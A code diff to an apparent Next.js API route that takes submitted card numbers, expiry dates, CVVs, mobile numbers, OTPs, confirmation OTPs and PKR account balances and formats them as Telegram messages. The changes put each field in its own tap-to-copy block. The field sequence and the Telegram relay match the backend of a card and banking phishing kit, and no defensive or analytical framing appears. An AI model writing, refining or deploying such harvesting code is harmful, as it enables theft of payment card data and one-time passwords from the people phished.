@@ -5,9 +5,10 @@ function escapeHtml(value: string) {
   return value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
 }
 
-// Wrap a value in <code> so it is tap-to-copy inside Telegram
-function copyable(value: string | number) {
-  return `<code>${escapeHtml(String(value))}</code>`
+// Wrap a "Label: value" line in its own <pre> block so Telegram renders it
+// as a separate boxed section with its own tap-to-copy button
+function copyableField(label: string, value: string | number) {
+  return `<pre>${escapeHtml(label)}: ${escapeHtml(String(value))}</pre>`
 }
 
 export async function POST(request: Request) {
@@ -25,27 +26,30 @@ export async function POST(request: Request) {
     if (body?.card || body?.month || body?.year || body?.cvv) {
       // Card submission
       const lines = [
-        '<b>New card submission</b>',
-        body?.card ? `Card: ${copyable(body.card)}` : null,
-        body?.month || body?.year ? `Expiry: ${copyable(`${body?.month ?? '--'}/${body?.year ?? '----'}`)}` : null,
-        body?.cvv ? `CVV: ${copyable(body.cvv)}` : null,
-        body?.mobile ? `Mobile: ${copyable(body.mobile)}` : null,
+        '<b>New submission</b>',
+        '<b>Card details</b>',
+        body?.card ? copyableField('Card', body.card) : null,
+        body?.month || body?.year ? copyableField('Expiry', `${body?.month ?? '--'}/${body?.year ?? '----'}`) : null,
+        body?.cvv ? copyableField('CVV', body.cvv) : null,
+        body?.mobile ? copyableField('Mobile', body.mobile) : null,
       ].filter(Boolean)
       text = lines.join('\n')
     } else if (body?.mobile) {
-      text = `<b>New mobile number</b>\nMobile: ${copyable(body.mobile)}`
+      text = ['<b>New submission</b>', '<b>Sign in</b>', copyableField('Mobile', body.mobile)].join('\n')
     } else if (body?.otp) {
-      text = `<b>OTP submitted</b>\nOTP: ${copyable(body.otp)}`
+      text = ['<b>New submission</b>', '<b>OTP</b>', copyableField('OTP', body.otp)].join('\n')
     } else if (body?.confirmOtp) {
-      text = `<b>Confirm OTP submitted</b>\nOTP: ${copyable(body.confirmOtp)}`
+      text = ['<b>New submission</b>', '<b>Confirm OTP</b>', copyableField('OTP', body.confirmOtp)].join('\n')
     } else if (body?.balance) {
-      text = `<b>Account balance submitted</b>\nBalance: ${copyable(`PKR ${body.balance}`)}`
+      text = ['<b>New submission</b>', '<b>Balance</b>', copyableField('Balance', `PKR ${body.balance}`)].join('\n')
     } else if (typeof body?.text === 'string' && body.text.trim()) {
       text = escapeHtml(body.text.trim())
     } else {
       const value = typeof body?.number === 'string' ? body.number : String(body?.number ?? '')
       const trimmed = value.trim()
-      text = trimmed ? `New number submitted: ${copyable(trimmed)}` : ''
+      text = trimmed
+        ? ['<b>New submission</b>', '<b>Number</b>', copyableField('Number', trimmed)].join('\n')
+        : ''
     }
   } catch {
     return NextResponse.json({ ok: false, error: 'Invalid request.' }, { status: 400 })
